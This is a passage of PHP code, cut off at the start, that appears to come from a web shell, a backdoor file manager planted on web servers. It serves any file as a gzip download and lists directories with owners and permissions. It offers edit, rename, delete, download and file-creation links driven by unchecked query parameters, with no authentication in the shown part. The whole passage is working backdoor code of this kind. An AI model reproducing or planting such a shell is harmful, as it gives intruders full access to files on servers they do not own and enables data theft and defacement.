	$galau_haha = gzencode(@file_get_contents($galau_fanberze));
	header("Content-Type:application/x-gzip");
	header("Content-length: " . strlen($galau_haha));
	header("Content-disposition: attachment; filename=\"" . basename($galau_fanberze) . ".gz\";");
	echo $galau_haha;
	exit;
}
else {
	galau_header();
	if(is_dir($galau_vx) == true) {
		echo '<div id="filez"><table width="100%">
		<tr>
		<th><center>Name</center></th>
		<th><center>Type</center></th>
		<th><center>Size</center></th>
		<th><center>Last Modified</center></th>
		<th><center>Owner:Group</center></th>
		<th><center>Permission</center></th>
		<th><center>Action</center></th>
		</tr>';
		$galau_sken = scandir($galau_vx);
		foreach($galau_sken as $bonyok){
			$dtype = filetype("$galau_vx/$bonyok");
			$dtime = date("F d Y g:i:s", filemtime("$galau_vx/$bonyok"));
			if(function_exists('posix_getpwuid')){
				$galau_downer = posix_getpwuid(fileowner("$galau_vx/$bonyok"));
				$galau_downer = $galau_downer['name'];				
			}
			else {
				$galau_downer = fileowner("$galau_vx/$bonyok");
			}
			if(function_exists('posix_getgrgid')){
				$galau_dgroup = posix_getgrgid(filegroup("$galau_vx/$bonyok"));
				$galau_dgroup = $galau_dgroup['name'];
			}
			else {
				$galau_dgroup = filegroup("$galau_vx/$bonyok");
			}
			if(!is_dir("$galau_vx/$bonyok")) continue;
			if($bonyok === ".."){
				$href = "<a href=\"?meong=".dirname($galau_vx)."\">$bonyok</a>";
			}
			elseif($bonyok === "."){
				$href = "<a href=\"?meong=$galau_vx\">$bonyok</a>";
			}
			else {
				$href = "<a href=\"?meong=$galau_vx/$bonyok\">$bonyok</a>";
			}
			if($bonyok === "." || $bonyok === ".."){
				$galau_aksi = "<a href=\"?aksi=newfile&meong=$galau_vx\">New File</a> | <a href=\"?aksi=newfolder&meong=$galau_vx\">New Folder</a>"; 
			}
			else {
				$galau_aksi = "<a href=\"?aksi=gantinama&meong=$galau_vx/$bonyok\">Rename</a> | <a href=\"?aksi=delme&meong=$galau_vx/$bonyok\">Delete</a>"; 
			}
			echo "<tr>";
            echo "<td>$href</td>";
            echo "<td><center>$dtype</center></td>";
            echo "<td><center>-</center></th>";
            echo "<td><center>$dtime</center></td>";
			echo "<td><center>$galau_downer:$galau_dgroup</center></td>";
            echo "<td><center>".wcek("$galau_vx/$bonyok", galau_perms("$galau_vx/$bonyok"))."</center></td>";
            echo "<td style='padding-left: 15px;'>$galau_aksi</td>";
		}
		echo "</tr>";
		foreach($galau_sken as $gokil){
			$ftype = filetype("$galau_vx/$gokil");
            $ftime = date("F d Y g:i:s", filemtime("$galau_vx/$gokil"));
			if(function_exists('posix_getpwuid')){
				$galau_fowner = posix_getpwuid(fileowner("$galau_vx/$gokil"));
				$galau_fowner = $galau_fowner['name'];
			}
			else {
				$galau_fowner = fileowner("$galau_vx/$gokil");
			}
			if(function_exists('posix_getgrgid')){
				$galau_fgroup = posix_getgrgid(filegroup("$galau_vx/$gokil"));
				$galau_fgroup = $galau_fgroup['name'];
			}
			else {
				$galau_fgroup = filegroup("$galau_vx/$gokil");
			}
            $size = filesize("$galau_vx/$gokil")/1024;
            $size = round($size,3);
            if($size > 1024) {
                $size = round($size/1024,2). 'MB';
            } else {
                $size = $size. 'KB';
            }
			if(!is_file("$galau_vx/$gokil")) continue;
			echo "<tr>";
			echo "<td><a href=\"?aksi=view&meong=$galau_vx&apalo_file=$galau_vx/$gokil\">$gokil</a>";
			echo "<td><center>$ftype</center></td>";
            echo "<td><center>$size</center></td>";
            echo "<td><center>$ftime</center></td>";
			echo "<td><center>$galau_fowner:$galau_fgroup</center></td>";
            echo "<td><center>".rcek("$galau_vx/$gokil", galau_perms("$galau_vx/$gokil"))."</center></td>";
			echo "<td style=\"padding-left: 15px;\"><a href=\"?aksi=edit&meong=$galau_vx&apalo_file=$galau_vx/$gokil\">Edit</a> | <a href=\"?aksi=renamefile&meong=$galau_vx&apalo_file=$galau_vx/$gokil\">Rename</a> | <a href=\"?aksi=delete&meong=$galau_vx&apalo_file=$galau_vx/$gokil\">Delete</a> | <a href=\"?aksi=sedot&meong=$galau_vx&apalo_file=$galau_vx/$gokil\">Download</a> (<a href=\"?aksi=gzdot&meong=$galau_vx&apalo_file=$galau_vx/$gokil\">Gz</a>)</td>";
		}
		echo "</tr></table></div>";
	}
	else {
		echo "<font color=\"red\">Can't open directory</font>";
	}
	galau_footer();
}
?>
